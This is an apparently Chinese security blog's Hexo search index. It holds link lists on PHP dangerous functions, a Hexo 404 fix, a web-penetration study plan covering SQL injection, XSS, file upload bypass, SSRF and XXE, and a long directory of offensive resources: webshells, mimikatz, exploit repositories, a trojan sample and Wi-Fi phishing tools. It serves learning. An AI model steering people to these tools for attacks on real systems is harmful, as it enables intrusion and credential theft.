<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php代码审计</title>
      <link href="/2020/06/08/php-dai-ma-shen-ji/"/>
      <url>/2020/06/08/php-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP代码审计-常见危险函数"><a href="#PHP代码审计-常见危险函数" class="headerlink" title="PHP代码审计-常见危险函数"></a>PHP代码审计-常见危险函数</h1><p><a href="https://blog.csdn.net/XavierDarkness/article/details/78041875" target="_blank" rel="noopener">https://blog.csdn.net/XavierDarkness/article/details/78041875</a></p><p>## </p><h1 id="常见PHP危险函数及特殊函数"><a href="#常见PHP危险函数及特殊函数" class="headerlink" title="常见PHP危险函数及特殊函数"></a>常见PHP危险函数及特殊函数</h1><p><a href="https://blog.csdn.net/qq_17204441/article/details/88834109?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/88834109?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-1</a></p><h1 id="PHP危险函数总结"><a href="#PHP危险函数总结" class="headerlink" title="PHP危险函数总结"></a>PHP危险函数总结</h1><p><a href="https://blog.csdn.net/qq_43431158/article/details/99673451?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/99673451?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6.nonecase</a></p><h2 id="PHP代码命令注入小结"><a href="#PHP代码命令注入小结" class="headerlink" title="PHP代码命令注入小结"></a>PHP代码命令注入小结</h2><p><a href="https://www.freebuf.com/column/166385.html" target="_blank" rel="noopener">https://www.freebuf.com/column/166385.html</a></p><h1 id="常见危险函数及特殊函数"><a href="#常见危险函数及特殊函数" class="headerlink" title="常见危险函数及特殊函数"></a>常见危险函数及特殊函数</h1><p><a href="https://www.jianshu.com/p/277294c1a9f8" target="_blank" rel="noopener">https://www.jianshu.com/p/277294c1a9f8</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo404问题</title>
      <link href="/2020/05/12/hexo404-wen-ti/"/>
      <url>/2020/05/12/hexo404-wen-ti/</url>
      
        <content type="html"><![CDATA[<h4 id="方案一（本人）"><a href="#方案一（本人）" class="headerlink" title="方案一（本人）"></a>方案一（本人）</h4><p>我申请了个人域名（godtao.com），并将其替换了大长串的Github域名（guchangan1.github.io），所以本解决方法适用于已经更换成个人域名的小伙伴，方法如下：</p><p><em>1</em> 执行 hexo g -d ,</p><p><em>2</em> 登陆Github官网</p><p><em>3</em> 打开项目仓库</p><p><em>4</em> 进入Settings设置</p><p><em>5</em> 将页面倒数第二目录Github Page中的Custom domain设置为个人域名并保存</p><p><em>6</em> 点击仓库名旁的rename（不用改动，只需点击）</p><p>恭喜，此时在浏览器中便可以打开博客了了！</p><h4 id="方案二（网上）"><a href="#方案二（网上）" class="headerlink" title="方案二（网上）"></a>方案二（网上）</h4><p>有些小伙伴之所以产生404错误，一个可能的原因是仓库名与_condig.yml中的设置存在出入，解决办法如下：</p><p>更改(rename)仓库名，使之与你的的github的登陆链接相一致。</p><h4 id="方案三（网上）"><a href="#方案三（网上）" class="headerlink" title="方案三（网上）"></a>方案三（网上）</h4><p>还一个可能产生404的原因便是因为缺少了index.html文件，解决方案如下：</p><p>在git bash中敲入</p><p>npm install hexo-generator-index –save</p><p>之后便有index.html文件了。不妨重新hexo clean，hexo g -d试试。</p><p>转载<a href="https://www.jianshu.com/u/a23739c6c889" target="_blank" rel="noopener">半缘青荇</a></p>]]></content>
      
      
      <categories>
          
          <category> 问题归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客404问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>study plan</title>
      <link href="/2020/05/11/study-plan/"/>
      <url>/2020/05/11/study-plan/</url>
      
        <content type="html"><![CDATA[<h2 id="一-开始前的思考"><a href="#一-开始前的思考" class="headerlink" title="一.开始前的思考"></a>一.开始前的思考</h2><p><strong>我真的喜欢搞安全吗?</strong><br><strong>我只是想通过安全赚钱钱吗?</strong><br><strong>我不知道做什么就是随便</strong><br><strong>一辈子做信息安全吗</strong></p><pre><code>这些不想清楚会对你以后的发展很不利，与其盲目的学习web安全，不如先做一个长远的计划。否则在我看来都是浪费时间。如果你考虑好了参照我的计划进行学习,我不敢保证你实践完多牛逼，但是找5k-8k的工作绝对不成问题。</code></pre><p>1.目的</p><pre><code>本问题目的是带大家快速入门web安全，不会搞些虚张声势的东西都是我的学习经验. 不会涉及到特别详细的技术,而是指导你去如何系统的学习少走弯路，节约时间。要有自信。不要觉得任何人和任何事有多牛逼，不低估自己，不高估别人。认真学习。</code></pre><p>2.经验</p><pre><code>我们在学习web安全或者任何东西时都需要分阶段专注学习,比如研究XSS那么这段时间大部分精力只研究XSS。XSS通常结合CSRF来达到更好的利用效果，但是不要把太多时间放到csrf上，研究透彻xss后在研究下一个漏洞类型,要有重点的研究东西。</code></pre><p>3.多看书和分析文章</p><pre><code>学习代码审计时我认为最有效的方法，先去阅读相关的书籍然后找两篇分析0day的文章，照葫芦画瓢分析文章中一样版本的代码，这对你成长很有帮助，进步也非常快。</code></pre><p>4.整理笔记</p><pre><code>这个我觉得最重要，这是一个好习惯 可以让我们重新把学习的技术做一个总结和巩固。在总结的过程形成自己对技术的理解与创新。从而让书本上的知识变成自己的东西。</code></pre><h2 id="二，零基础web安全学习计划"><a href="#二，零基础web安全学习计划" class="headerlink" title="二，零基础web安全学习计划"></a>二，零基础web安全学习计划</h2><p>2.1 HTTP协议请求  (TIME: 一周)对以下下知识点做了解学习</p><pre><code>http协议请求 http状态码              post / get 区别       可以使用Chrome浏览器中F12查看“Network”标签中的HTTP请求响应,来了解HTTP协议请求.</code></pre><p>2.2.危险的HTTP头参数  (TIME: 一周)</p><pre><code>HTTP请求时需对一些必要的参数做一些了解,这些参数也会造成很严重的安全安全问题如下：user_agent X-Forwarded-ForRefererclien_ipCookie</code></pre><p>2.3 专业术语天  (TIME: 一天)了解如下专业术语的意思</p><pre><code>webshell 菜刀0day SQL注入上传漏洞XSSCSRF一句话木马</code></pre><p>2.4 专业黑客工具使用  (TIME: 10天)</p><pre><code>熟悉如何渗透测试安全工具，掌握这些工具能大大提高你在工作的中的效率sqlmap 学习地址：https://blog.csdn.net/wxh0000mm/article/details/90695425Burpsuite nmapw3af nessus </code></pre><p>4.脚本语言＋代码审计入门 (TIME: 10天) </p><pre><code>推荐php不用学的太灵通，我们又不是搞开发，了解基本语法和一些危险函数即可如：open exec 等函数会造成什么漏洞,了解了php中的危险函数会造成那些漏洞可举一反三套用到别的脚本当中 asp aspx java这些语言的危险函数可能只是写法不一样功能是相同的,了解这些后就可以来做一些web漏洞的代码审计了。php入门学习  学习地址：https://www.w3cschool.cn/php/php代码审计</code></pre><p>5.Sql注射 (TIME: 3天) </p><pre><code>零基础就先用最有效的办法注入推荐注入工具 sqlmap如何使用？如果你不想只停留在使用工具的层面，那么你需要学习一下数据库，mysql sqlserver 随便先学一个前期学会 selsct 就行，php尝试自己写一个查询数据库的脚本来了解手工sql注入的原理，这样进步会很快,如果想深入可以把各种数据库注入都温习一边。关于需要掌握的技术点：</code></pre><pre><code>\1. 数字型注入 2.字符型注入 3.搜索注入 4.盲注(sleep注入) </code></pre><p>5.sqlmap使用 6.宽字节注入</p><pre><code>mysql入门  学习地址：https://www.w3cschool.cn/mysql/Sqlmapsleep原理</code></pre><p>6.CSRF 跨站点请求 (TIME: 3天)</p><pre><code>为什么会造成CSRF，GET型与POST型CSRF 的区别, 如何防御使用 token防止 CSRF？</code></pre><p>7.XSS (TIME: 7天)</p><pre><code>要研究xss首先了解同源策略 ，Javascript 也要好好学习一下 ，以及html实体 html实体的10 或16进制还有javascript 的8进制和16进制编码，XSS学习地址 进制编码  学习地址：http://su.xmd5.org/static/drops/tips-689.html同源策略  学习地址：http://suo.im/5KrjtI</code></pre><p>8.文件上传漏洞 (TIME: 7天)  </p><pre><code>了解下开源编辑器上传都有哪些漏洞，如何绕过系统检测上传一句话木马上传绕过学习</code></pre><p>9 PHP-远程/本地 文件包含 (TIME: 10天)</p><pre><code>去学习下 include() include_once() require() require_once() fopen() readfile() 这些php函数是如何产生文件包含漏洞, 本地包含与远程包含的区别。以及利用文件包含时的一些技巧如：截断 /伪url/超长字符截断 等 。</code></pre><p>10 PHP-命令执行 (TIME: 3天)</p><pre><code>PHP代码中常见的代码执行函数有：</code></pre><p><img src="D:%5Cblog%5Chexo-matery-modified%5Csource_posts%5C1589212299863.png" alt="1589212299863"></p><pre><code>了解这些函数的作用然后搞清楚如何造成的代码执行漏洞。</code></pre><p>12 SSRF  (TIME: 3天)</p><pre><code>了解ssrf的原理,以及ssrf的危害。ssrf能做什么。当我们在进行web渗透的时候是无法访问目标的内部网络的,那么这个时候就用到了ssrf漏洞，利用外网存在ssrf的web站点可以获取如下信息。1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;2.攻击运行在内网或本地的应用程序（比如溢出）;3.对内网web应用进行指纹识别，通过访问默认文件实现;4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;5.利用file协议读取本地文件等。</code></pre><p>13 逻辑漏洞 (TIME: 7天)</p><pre><code>常见的逻辑漏洞一般都会在如下地方出现1.订金额任意修改－－购物站经常出现2.验证码回传 3.越权操作，其主要原因是没对ID参数做cookie验证导致。4.找回密码存在设计缺陷5.接口无限制枚举</code></pre><p>14 xee（XML外部实体注入） (TIME: 5天)</p><pre><code>当允许xml引入外部实体时，通过构造恶意内容，可以导致文件读取、命令执行、内网探测等危害http://blog.sina.com.cn/s/blog_8194b04f0102wsoe.html</code></pre><p>15 XPath注入 (TIME: 5天)</p><pre><code>path注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击https://blog.csdn.net/quiet_girl/article/details/50588130</code></pre><p>16 服务器解析漏洞Iis 解析漏洞  </p><pre><code>nginx 解析漏洞 tomcat 后台上传漏洞jboss 上传漏洞</code></pre><p>如果上述漏洞原理掌握的都差不多那么你就可以去找个工作实践一下了</p><p>| 转自：先知社区  </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 学习计划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>source-notebook2</title>
      <link href="/2020/04/18/source-notebook2/"/>
      <url>/2020/04/18/source-notebook2/</url>
      
        <content type="html"><![CDATA[<p>## </p><h2 id="安全资源"><a href="#安全资源" class="headerlink" title="安全资源"></a>安全资源</h2><p>安全资源包括安全书籍，资料，安全教程，学习平台等等。</p><h3 id="设备基线加固资料"><a href="#设备基线加固资料" class="headerlink" title="设备基线加固资料"></a>设备基线加固资料</h3><p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><h3 id="内网渗透学习资料"><a href="#内网渗透学习资料" class="headerlink" title="内网渗透学习资料"></a>内网渗透学习资料</h3><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h3 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h3><p><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><h3 id="安全脑图"><a href="#安全脑图" class="headerlink" title="安全脑图"></a>安全脑图</h3><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><h3 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h3><p>开源漏洞靶场</p><p><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">https://github.com/phith0n/vulhub</a></p><p>WebGoat漏洞练习环境</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>Damn Vulnerable Web Application(漏洞练习平台)</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><h2 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h2><p>安全工具包括：扫描器,漏洞利用工具,信息收集工具等等</p><h3 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h3><p>端口扫描器Nmap</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>漏洞路由扫描器</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h3 id="WEB工具"><a href="#WEB工具" class="headerlink" title="WEB工具"></a>WEB工具</h3><p>webshell大合集</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>XSS数据接收平台</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>Short for command injection exploiter，web向命令注入检测工具</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理，通过加载sqlmap api进行sqli实时检测</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>.git泄露利用EXP</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>一款开源WAF</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><h3 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h3><p>windows渗透神器</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h3 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h3><p>msf</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><p>ExploitDB官方git版本</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>Simple test for CVE-2016-2107</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权)</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><p>中间人攻击框架</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>可扩展的中间人代理工具</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>密码破解工具</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h3><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h3 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h3><p>二进制EXP编写工具</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h3 id="隐写相关工具"><a href="#隐写相关工具" class="headerlink" title="隐写相关工具"></a>隐写相关工具</h3><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料"></a>各类安全资料</h3><p>域渗透教程</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="noopener">https://github.com/smartFlash/pySecurity</a></p><p>data_hacking合集</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>ctf及黑客资源合集</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>《DO NOT FUCK WITH A HACKER》</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><p>近年ctf writeup大全</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h3><p>大礼包（什么都有）</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project-analysis</a></p><p>python框架，库，资源大合集</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 